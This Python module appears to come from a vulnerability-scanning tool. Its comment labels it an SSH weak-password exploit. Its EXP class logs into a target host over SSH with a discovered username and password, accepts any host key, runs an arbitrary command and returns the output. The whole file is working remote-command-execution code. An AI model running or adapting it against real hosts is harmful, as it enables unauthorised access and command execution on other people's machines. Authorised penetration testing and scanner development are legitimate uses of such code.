# -*- coding:utf-8 -*-
# ssh弱密码
import paramiko

from VulnScanModel.models import VulnScan
from vulscan_Project.requestClass import Requests


class EXP:
    def __init__(self, vuln: VulnScan):
        self.vuln = vuln
        self.requestUtil = Requests(vuln.cookies)

    def exp(self, cmd, content=""):
        ssh = paramiko.SSHClient()  # 创建SSH对象
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # 允许连接不在know_hosts文件中的主机
        ssh.connect(hostname=self.vuln.ip, port=22, username=self.vuln.specify.split(":")[0], password=self.vuln.specify.split(":")[-1], timeout=1)  # 连接服务器
        stdin, stdout, stderr = ssh.exec_command(cmd)
        res, err = stdout.read(), stderr.read()
        result = res if res else err
        return result.decode()